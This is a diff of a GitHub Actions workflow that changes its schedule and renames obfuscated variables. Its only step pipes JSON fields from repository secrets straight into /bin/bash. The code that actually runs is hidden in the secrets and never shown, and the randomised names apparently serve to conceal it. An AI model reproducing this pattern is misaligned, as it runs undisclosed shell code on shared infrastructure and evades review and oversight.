@@ -1,22 +1,26 @@
 name: aftershrug
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 2/6 * * *'
+    - cron: '6 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: aftershrug
         env:
-          hlln7713: ${{ secrets.hlln7713 }}
+          he7543: ${{ secrets.he7543 }}
         run: |
-          echo $hlln7713 | jq -r .brqrt9250 | /bin/bash
-          echo $kjue5107 | jq -r .w398 | /bin/bash
-          echo $oqp9 | jq -r .e8084 | /bin/bash
-          echo $sldz14554 | jq -r .spk28 | /bin/bash
-          echo $fhh69 | jq -r .p10 | /bin/bash
+          echo $he7543 | jq -r .uv88314 | /bin/bash
+          echo $imbz76 | jq -r .dg58 | /bin/bash
+          echo $fsatr6 | jq -r .jdlto91 | /bin/bash
+          echo $rmcvb4 | jq -r .suse29501 | /bin/bash
+          echo $xgcil27288 | jq -r .enn2 | /bin/bash
+          echo $z916 | jq -r .ldlss4929 | /bin/bash
+          echo $ybe74 | jq -r .jjrcx63030 | /bin/bash
+          echo $hsprr834 | jq -r .td2434 | /bin/bash
+          echo $n62 | jq -r .dhnuw71 | /bin/bash
+          echo $vjhgb99 | jq -r .j4 | /bin/bash
+          echo $dflb1 | jq -r .hsdj64 | /bin/bash
 
